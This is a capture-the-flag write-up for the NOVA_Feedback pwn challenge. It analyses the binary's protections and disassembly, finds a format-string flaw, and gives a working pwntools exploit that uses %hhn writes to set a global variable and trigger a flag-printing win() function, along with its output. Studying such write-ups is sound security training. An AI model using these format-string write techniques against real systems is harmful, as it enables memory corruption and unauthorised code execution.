# NOVA_Feedback - CTF Writeup

**Challenge Name:** NOVA_Feedback
**Category:** PWN
**Points:** 100


![](attachments/Pasted%20image%2020251130130646.png)

## Initial Reconnaissance

### Binary Analysis

First, let's examine the binary's properties:

```bash
$ file feedback
feedback: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, not stripped

$ checksec feedback
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

**Key Observations:**
- 64-bit binary
- **No stack canary** - potential for buffer overflows
- **NX enabled** - can't execute shellcode on stack
- **No PIE** - addresses are static
- **Not stripped** - function names are available

### Connecting to the Service

```bash
$ nc 38.60.200.116 9002
=======================================
        NOVA Feedback Interface
=======================================

Name: test
Hello test! Welcome aboard.

Menu:
  1) Echo
  2) Feedback
  3) Exit
>
```

The application has three menu options:
1. **Echo** - Echoes back user input
2. **Feedback** - Collects feedback
3. **Exit** - Terminates

### Finding Interesting Functions

```bash
$ nm feedback | grep -E "(flag|win|admin|secret)"
0000000000401196 T win
```

Excellent! There's a `win` function. Let's disassemble it:

```bash
$ objdump -d feedback | grep -A 20 "<win>:"
0000000000401196 <win>:
  401196:	push   rbp
  401197:	mov    rbp,rsp
  40119a:	lea    rax,[rip+0xe67]        # 402008
  4011a1:	mov    rdi,rax
  4011a4:	call   401030 <puts@plt>
  4011a9:	lea    rax,[rip+0xe78]        # 402028
  4011b0:	mov    rdi,rax
  4011b3:	call   401030 <puts@plt>
  4011b8:	lea    rax,[rip+0xe88]        # 402047
  4011bf:	mov    rdi,rax
  4011c2:	call   401040 <system@plt>    ← Calls system()
  4011c7:	mov    edi,0x0
  4011cc:	call   4010a0 <exit@plt>
```

The `win` function calls `system()` with an argument. Let's check what it executes:

```bash
$ strings feedback | grep -A 2 -B 2 "cat"
[+] Premium Tier Activated
[+] Delivering your reward...
cat ./flag
```

Perfect! The `win` function executes `system("cat ./flag")`.

### Finding the Magic Variable

```bash
$ nm feedback | grep magic
000000000040408c b magic

$ strings feedback | grep magic
[i] magic = 0x%08x
magic
```

There's a global variable `magic` at address `0x40408c` that gets printed with format `[i] magic = 0x%08x`.

---

## Vulnerability Analysis

### Analyzing Main Function

Let's trace through the main function to find vulnerabilities:

```asm
401243 <main>:
  ...
  401247:	sub    rsp,0x2a0           # Allocate 672 bytes on stack
  ...
  4012f8:	lea    rax,[rbp-0x90]      # Name buffer
  4012ff:	mov    esi,0x80            # Size: 128 bytes
  401304:	mov    rdi,rax
  401307:	call   4011d1 <safe_read>  # Read name
```

The name is read into a buffer at `rbp-0x90` with size `0x80` (128 bytes).

### Analyzing Option 1 (Echo)

```asm
4013c1:	lea    rax,[rip+0xd4d]        # "Say something: "
  ...
4013e4:	lea    rax,[rbp-0x2a0]        # Echo buffer
4013eb:	mov    esi,0x100              # Size: 256 bytes
4013f0:	mov    rdi,rax
4013f3:	call   4011d1 <safe_read>
  ...
4013f8:	lea    rax,[rip+0xd26]        # "You said: "
4013ff:	mov    rdi,rax
401402:	call   401060 <printf@plt>
  ...
40140c:	lea    rax,[rbp-0x2a0]        # Our input
401413:	mov    rdi,rax
401416:	mov    eax,0x0
40141b:	call   401060 <printf@plt>    ← FORMAT STRING VULNERABILITY!
```

**Echo option has format string vulnerability**, but it doesn't help us directly reach the win condition.

### Analyzing Option 2 (Feedback)

```asm
401443:	lea    rax,[rip+0xce7]        # "Leave your feedback below:"
  ...
401475:	lea    rax,[rbp-0x2a0]        # Feedback buffer
40147c:	mov    esi,0x200              # Size: 512 bytes!
401481:	mov    rdi,rax
401484:	call   4011d1 <safe_read>
  ...
401489:	lea    rax,[rip+0x2bfc]       # Load &magic
401490:	mov    QWORD PTR [rbp-0x8],rax
401494:	mov    rax,QWORD PTR [rbp-0x8]
401498:	lea    rdi,[rax+0x3]          # magic+3
40149c:	mov    rax,QWORD PTR [rbp-0x8]
4014a0:	lea    rcx,[rax+0x2]          # magic+2
4014a4:	mov    rax,QWORD PTR [rbp-0x8]
4014a8:	lea    rdx,[rax+0x1]          # magic+1
4014ac:	mov    rsi,QWORD PTR [rbp-0x8] # magic+0
4014b0:	lea    rax,[rbp-0x2a0]        # Our feedback
4014b7:	mov    r8,rdi                 # Arg 5: magic+3
4014ba:	mov    rdi,rax                # Arg 1: format string (OUR INPUT!)
4014bd:	mov    eax,0x0
4014c2:	call   401060 <printf@plt>    ← VULNERABLE!
```

**Critical Discovery:** The Feedback option uses our input as a **format string** and passes pointers to `magic+0`, `magic+1`, `magic+2`, `magic+3` as arguments!

After the printf, it checks the magic value:

```asm
4014c7:	mov    eax,DWORD PTR [rip+0x2bbf]  # Load magic
4014cd:	cmp    eax,0x13371337              # Compare with 0x13371337
4014d2:	jne    4014f2 <main+0x2af>
4014d4:	lea    rax,[rip+0xc71]             # Success message
4014db:	mov    rdi,rax
4014de:	call   401030 <puts@plt>
4014e3:	mov    eax,0x0
4014e8:	call   401196 <win>                ← Calls win()!
```

**Eureka!** If `magic == 0x13371337`, the program calls the `win()` function!

---

## Exploitation Strategy

### The Plan

1. Use the **Feedback** option (not Echo!)
2. Craft a format string payload to write `0x13371337` to the `magic` variable at `0x40408c`
3. The program will check magic, see it equals `0x13371337`, and call `win()`
4. The `win()` function executes `system("cat ./flag")`

### Format String Analysis

The vulnerable `printf` call has these arguments:

| Register | Arg # | Points To | Format String Offset |
|----------|-------|-----------|----------------------|
| `rdi`    | 1     | Our input (format string) | - |
| `rsi`    | 2     | `magic+0` | `%1$` |
| `rdx`    | 3     | `magic+1` | `%2$` |
| `rcx`    | 4     | `magic+2` | `%3$` |
| `r8`     | 5     | `magic+3` | `%4$` |

This is **perfect** for a format string write! The arguments already point to the bytes we need to modify.

### Target Value Breakdown

We need to write `0x13371337` to magic:


Address      | Value | Decimal
-------------|-------|--------
0x40408c     | 0x37  | 55
0x40408d     | 0x13  | 19
0x40408e     | 0x37  | 55
0x40408f     | 0x13  | 19


## Format String Payload

We'll use `%hhn` (write 1 byte) with cumulative character counts:

```python
# Byte 0: Write 0x37 (55 bytes total)
payload = b'%55c%1$hhn'

# Byte 1: Write 0x13 (need 19 total, currently at 55)
#         55 + 220 = 275, 275 % 256 = 19 ✓
payload += b'%220c%2$hhn'

# Byte 2: Write 0x37 (need 55 total, currently at 19)
#         19 + 36 = 55 ✓
payload += b'%36c%3$hhn'

# Byte 3: Write 0x13 (need 19 total, currently at 55)
#         55 + 220 = 275, 275 % 256 = 19 ✓
payload += b'%220c%4$hhn'
```

The `%hhn` writes only the lowest byte of the character count, which is exactly what we need!

---

## Solution

### Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

TARGET = 0x13371337

io = remote('38.60.200.116', 9002)

# Enter name
io.recvuntil(b'Name: ')
io.sendline(b'Hacker')
io.recvuntil(b'> ')

# Choose Feedback option
io.sendline(b'2')
io.recvuntil(b'> ')

# Format string payload to write 0x13371337 to magic
payload = b'%55c%1$hhn'   # Write 0x37 to magic+0
payload += b'%220c%2$hhn'  # Write 0x13 to magic+1
payload += b'%36c%3$hhn'   # Write 0x37 to magic+2
payload += b'%220c%4$hhn'  # Write 0x13 to magic+3

log.info(f"Payload: {payload}")
io.sendline(payload)

# Receive flag
response = io.recvall(timeout=5).decode(errors='ignore')
print(response)

if 'NOVA_CTF' in response:
    log.success("FLAG FOUND!")
    start = response.find('NOVA_CTF')
    end = response.find('}', start) + 1
    flag = response[start:end]
    print(f"\n FLAG: {flag}\n")

io.close()
```

## The Result

```bash
python3 get_flag.py 
[+] Opening connection to 38.60.200.116 on port 9002: Done
[*] Payload: b'%55c%1$hhn%220c%2$hhn%36c%3$hhn%220c%4$hhn'
[+] Receiving all data: Done (652B)
[*] Closed connection to 38.60.200.116 port 9002
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
[+] Processing feedback...

[+] Premium Tier Activated
[+] Delivering your reward...

NOVA_CTF{f0rm4t_5tr1ng_c4n_wr1t3}

[+] FLAG FOUND!

 FLAG: NOVA_CTF{f0rm4t_5tr1ng_c4n_wr1t3}
```


## Flag

`NOVA_CTF{f0rm4t_5tr1ng_c4n_wr1t3}`


![](attachments/Pasted%20image%2020251130131225.png)

